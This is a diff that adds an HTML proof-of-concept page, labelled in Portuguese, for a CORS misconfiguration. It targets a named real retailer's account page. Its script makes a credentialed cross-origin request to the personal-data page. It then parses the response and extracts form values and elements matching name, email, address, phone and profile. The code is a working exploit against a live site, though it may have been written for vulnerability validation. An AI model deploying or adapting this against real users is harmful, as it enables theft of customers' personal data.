@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h2>CORS PoC - Validação</h2>
+  <p>Status: <b id="status">Aguardando...</b></p>
+  <p>Dados capturados:</p>
+  <pre id="output" style="background:#f5f5f5;padding:15px;max-height:500px;overflow:auto;font-size:12px;white-space:pre-wrap;word-break:break-all">
+    Aguardando resposta...
+  </pre>
+
+  <script>
+    document.getElementById('status').textContent = 'Fazendo request...';
+
+    fetch('https://www.expert.de/shop/mein-expert/persoenliche-daten', {
+      method: 'GET',
+      credentials: 'include'
+    })
+    .then(function(response) {
+      document.getElementById('status').textContent = 
+        'HTTP ' + response.status + ' - ' + 
+        'ACAO: ' + response.headers.get('access-control-allow-origin') + 
+        ' | Credentials: ' + response.headers.get('access-control-allow-credentials');
+      return response.text();
+    })
+    .then(function(html) {
+      // Mostrar HTML recebido
+      document.getElementById('output').textContent = html;
+
+      // Tentar extrair dados visíveis
+      var parser = new DOMParser();
+      var doc = parser.parseFromString(html, 'text/html');
+
+      var dados = [];
+
+      // Pegar inputs preenchidos
+      doc.querySelectorAll('input').forEach(function(el) {
+        if (el.value && el.value.trim() !== '') {
+          dados.push('INPUT [' + (el.name||el.id||el.type) + ']: ' + el.value);
+        }
+      });
+
+      // Pegar elementos com dados pessoais
+      doc.querySelectorAll('[class*="name"],[class*="email"],[class*="address"],[class*="phone"],[class*="user"],[class*="profile"]').forEach(function(el) {
+        var txt = (el.innerText || el.textContent || '').trim();
+        if (txt.length > 2 && txt.length < 300) {
+          dados.push('ELEMENTO [' + el.className + ']: ' + txt);
+        }
+      });
+
+      if (dados.length > 0) {
+        document.getElementById('output').textContent = 
+          '=== DADOS EXTRAÍDOS ===\n\n' + 
+          dados.join('\n') + 
+          '\n\n=== HTML COMPLETO ===\n\n' + html;
+      }
+    })
+    .catch(function(err) {
+      document.getElementById('status').textContent = 'ERRO: ' + err;
+      document.getElementById('output').textContent = err.toString();
+    });
+  </script>
+</body>
+</html>
